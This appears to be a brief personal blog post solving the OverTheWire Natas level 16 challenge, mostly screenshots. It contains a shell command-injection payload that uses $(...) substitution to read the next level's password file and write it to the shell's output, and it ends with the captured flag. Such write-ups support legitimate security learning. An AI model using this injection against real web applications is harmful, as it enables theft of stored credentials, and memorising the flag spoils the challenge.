---
layout: post
title: "natas16"
---

22-08-2026
14:56
![]({{ '/ctf/overthewire/natas/pics/Pasted%20image%2020260822145641.png' | relative_url }})
![]({{ '/ctf/overthewire/natas/pics/Pasted%20image%2020260822145702.png' | relative_url }})![]({{ '/ctf/overthewire/natas/pics/Pasted%20image%2020260822145738.png' | relative_url }})![]({{ '/ctf/overthewire/natas/pics/Pasted%20image%2020260822145809.png' | relative_url }})

we can write to the bash process using the pid in the proc folder:
```
# $$ is the pid of the current shell
# /fd/1 is standard output file descriptor
>> $(cat /etc/natas_webpass/natas17 > /proc/$$/fd/1) 
```
![]({{ '/ctf/overthewire/natas/pics/Pasted%20image%2020260825121753.png' | relative_url }})

flag: KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx